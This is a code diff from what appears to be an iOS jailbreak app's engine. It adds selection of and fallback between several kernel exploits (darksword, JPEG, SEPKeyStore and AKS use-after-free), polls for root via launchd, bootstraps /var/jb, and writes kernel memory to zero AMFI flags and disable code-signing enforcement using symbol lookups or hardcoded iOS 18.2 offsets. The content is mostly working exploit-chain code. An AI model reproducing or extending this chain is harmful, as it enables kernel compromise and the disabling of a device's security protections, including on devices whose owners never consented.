@@ -70,17 +70,88 @@ final class JailbreakEngine: ObservableObject {
         }
         
         state = .exploiting
-        appendLog("Running kernel exploit...")
         offsets_init()
         
-        mgr.run { [weak self] success in
+        // Multi-exploit selector: pick best exploit for this device/iOS
+        let selectedExploit = exploit_select_best()
+        let exploitName = String(cString: exploit_type_name(selectedExploit))
+        let exploitRange = String(cString: exploit_type_range(selectedExploit))
+        
+        appendLog("Selected exploit: \(exploitName) (\(exploitRange))")
+        
+        if selectedExploit == EXPLOIT_NONE {
+            fail("No exploit available for this device/iOS version")
+            return
+        }
+        
+        // Run the selected exploit
+        if selectedExploit == EXPLOIT_DARKSWORD {
+            // darksword uses the existing dspmgr.run() path
+            appendLog("Running darksword (socket KRW)...")
+            mgr.run { [weak self] success in
+                guard let self else { return }
+                if success {
+                    self.appendLog("✅ darksword success")
+                    self.progress = 0.25
+                    self.step2_initialize()
+                } else {
+                    // Try fallback exploit if darksword fails
+                    self.appendLog("⚠️ darksword failed — trying fallback...")
+                    self.step1_fallback()
+                }
+            }
+        } else {
+            // New exploits (JPEG UAF, SEPKeyStore UAF, AKS close UAF)
+            appendLog("Running \(exploitName)...")
+            DispatchQueue.global(qos: .userInitiated).async { [weak self] in
+                guard let self else { return }
+                let result = exploit_run_selected(selectedExploit)
+                DispatchQueue.main.async {
+                    if result == 0 {
+                        self.appendLog("✅ \(exploitName) success")
+                        self.progress = 0.25
+                        self.step2_initialize()
+                    } else {
+                        self.fail("\(exploitName) failed (ret=\(result))")
+                    }
+                }
+            }
+        }
+    }
+    
+    /// Fallback: try alternative exploits if primary fails
+    private func step1_fallback() {
+        var available: [exploit_type_t] = [EXPLOIT_NONE, EXPLOIT_NONE, EXPLOIT_NONE, EXPLOIT_NONE]
+        let count = exploit_list_available(&available, 4)
+        
+        // Find first non-darksword exploit
+        var fallback: exploit_type_t = EXPLOIT_NONE
+        for i in 0..<Int(count) {
+            if available[i] != EXPLOIT_DARKSWORD && available[i] != EXPLOIT_NONE {
+                fallback = available[i]
+                break
+            }
+        }
+        
+        guard fallback != EXPLOIT_NONE else {
+            fail("No fallback exploit available")
+            return
+        }
+        
+        let name = String(cString: exploit_type_name(fallback))
+        appendLog("Fallback: trying \(name)...")
+        
+        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
             guard let self else { return }
-            if success {
-                self.appendLog("✅ Exploit success")
-                self.progress = 0.25
-                self.step2_initialize()
-            } else {
-                self.fail("Kernel exploit failed")
+            let result = exploit_run_selected(fallback)
+            DispatchQueue.main.async {
+                if result == 0 {
+                    self.appendLog("✅ Fallback \(name) success")
+                    self.progress = 0.25
+                    self.step2_initialize()
+                } else {
+                    self.fail("All exploits failed")
+                }
             }
         }
     }
@@ -148,29 +219,31 @@ final class JailbreakEngine: ObservableObject {
             return (uid == 0, "uid=\(uid)", UInt64(uid))
         }
         
-        // Wait for result
-        DispatchQueue.main.asyncAfter(deadline: .now() + 15) { [weak self] in
-            guard let self else { return }
+        // Poll for result instead of fixed delay — check every 1s, timeout at 25s
+        var pollCount = 0
+        let maxPolls = 25
+        
+        func pollResult() {
+            pollCount += 1
             if self.root.rootConfirmed {
                 self.appendLog("✅ Root confirmed (uid=0)")
                 self.progress = 0.9
                 self.step5_bootstrap()
+            } else if pollCount >= maxPolls {
+                self.fail("Root verification timeout (\(maxPolls)s)")
+            } else if !self.root.isExecuting && pollCount > 3 {
+                // Operation finished but root not confirmed — failed
+                self.fail("Root verification failed (launchd returned non-zero uid)")
             } else {
-                // Check if still executing
-                if self.root.isExecuting {
-                    // Give more time
-                    DispatchQueue.main.asyncAfter(deadline: .now() + 10) {
-                        if self.root.rootConfirmed {
-                            self.progress = 0.9
-                            self.step5_bootstrap()
-                        } else {
-                            self.fail("Root verification timeout")
-                        }
-                    }
-                } else {
-                    self.fail("Root verification failed")
+                DispatchQueue.main.asyncAfter(deadline: .now() + 1.0) {
+                    pollResult()
                 }
             }
+        }
+        
+        // Start polling after 2s (give launchd time to connect)
+        DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
+            pollResult()
         }
     }
     
@@ -180,14 +253,15 @@ final class JailbreakEngine: ObservableObject {
         
         root.executeAsRoot(operation: "bootstrap") { rc in
             // Create /var/jb directory structure
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr/bin"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/usr/lib"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/etc"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/tmp"), 0o777)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/Library"), 0o755)
-            RootExecutor.rcall(rc, "mkdir", remote_alloc_str(rc, "/var/jb/Library/LaunchDaemons"), 0o755)
+            // Note: allocate strings, use them, then free to prevent memory leaks
+            let dirs = ["/var/jb", "/var/jb/usr", "/var/jb/usr/bin", "/var/jb/usr/lib",
+                        "/var/jb/etc", "/var/jb/tmp", "/var/jb/Library", "/var/jb/Library/LaunchDaemons"]
+            for dir in dirs {
+                let dirStr = remote_alloc_str(rc, dir)
+                let mode: UInt64 = dir.hasSuffix("/tmp") ? 0o777 : 0o755
+                RootExecutor.rcall(rc, "mkdir", dirStr, mode)
+                RootExecutor.rcall(rc, "free", dirStr)
+            }
             
             // Write marker file
             let markerPath = remote_alloc_str(rc, "/var/jb/.dsploit_bootstrapped")
@@ -230,7 +304,26 @@ final class JailbreakEngine: ObservableObject {
         }
         
         let slide = kernBase - 0xfffffff007004000
-        let amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+        
+        // Resolve AMFI data address dynamically via kernelcache symbol lookup
+        // Fallback to hardcoded offset if symbol resolution fails
+        var amfiDataSlid: UInt64 = 0
+        let amfiSym = ds_kcache_symbol_runtime("_amfi_data_base")
+        if amfiSym != 0 {
+            amfiDataSlid = amfiSym
+            appendLog("AMFI base resolved via kcache_sym: 0x\(String(amfiDataSlid, radix: 16))")
+        } else {
+            // Hardcoded fallback — only valid for specific iOS 18.2 builds
+            // This WILL be wrong on other versions. Log a warning.
+            amfiDataSlid = UInt64(0xfffffff00a330098) &+ slide
+            appendLog("⚠️ AMFI base using hardcoded fallback (may be wrong on this iOS version)")
+        }
+        
+        guard amfiDataSlid != 0 else {
+            appendLog("⚠️ Cannot resolve AMFI data address — skip")
+            step7_trustCacheInject()
+            return
+        }
         
         // All 10 AMFI boolean flags (confirmed writable in Exp 93/93b)
         let flagOffsets: [UInt64] = [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408]
@@ -245,14 +338,21 @@ final class JailbreakEngine: ObservableObject {
         
         if disabledCount == flagOffsets.count {
             appendLog("✅ AMFI disabled (\(disabledCount)/\(flagOffsets.count) flags → 0)")
-        } else {
+        } else if disabledCount > 0 {
             appendLog("⚠️ AMFI partial: \(disabledCount)/\(flagOffsets.count) flags disabled")
+        } else {
+            appendLog("⚠️ AMFI disable failed — address may be wrong for this iOS version")
         }
         
         // Also disable cs_enforcement in main kernel __DATA if available
-        // This is belt-and-suspenders — AMFI flags alone should suffice
-        let csEnforcementOffset: UInt64 = 0x8B8 // cs_enforcement_disable in kernel __DATA
-        let csAddr = kernBase &+ csEnforcementOffset
+        let csEnforcementSym = ds_kcache_symbol_runtime("_cs_enforcement_disable")
+        let csAddr: UInt64
+        if csEnforcementSym != 0 {
+            csAddr = csEnforcementSym
+        } else {
+            csAddr = kernBase &+ 0x8B8 // Hardcoded fallback
+        }
+        
         let csVal = ds_kread64_safe(csAddr)
         if csVal == 0 {
             ds_kwrite64(csAddr, 1) // 1 = enforcement disabled
